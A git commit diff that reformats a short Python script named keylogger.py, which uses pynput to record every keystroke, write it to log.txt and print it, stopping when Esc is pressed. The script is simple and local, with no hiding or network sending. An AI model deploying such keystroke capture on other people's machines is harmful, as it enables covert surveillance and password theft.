8ed29de2e611788bb3a4d4d8c14ef0d4c55f2df9
Piyush Kumar <piyush.kumarmaloo@gmail.com>
2020-11-21 16:47:41 +0530

    Add files via upload

--- keylogger.py
+++ keylogger.py
@@ -1,29 +1,34 @@
 from pynput.keyboard import Key, Listener
 
-count=0
-keys=[]
+count = 0
+keys = []
+
+
 def write_file(keys):
-    with open("log.txt","a") as f:
+    with open("log.txt", "a") as f:
         for key in keys:
-            k=str(key).replace("'","")
-            if k.find("space")>0:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
                 f.write('\n')
-            elif k.find("Key")==-1:
+            elif k.find("Key") == -1:
                 f.write(k)
-        
+
+
 def on_press(key):
-    global keys,count
+    global keys, count
     keys.append(key)
-    count+=1
+    count += 1
     write_file(keys)
     print("{}".format(key))
     """if count >= 10:
         count=0
         keys=[]"""
+
+
 def on_release(key):
-    if key==Key.esc:
+    if key == Key.esc:
         return False
-with Listener(on_press=on_press,on_release=on_release)as listener:
+
+
+with Listener(on_press=on_press, on_release=on_release)as listener:
     listener.join()
-    
-    
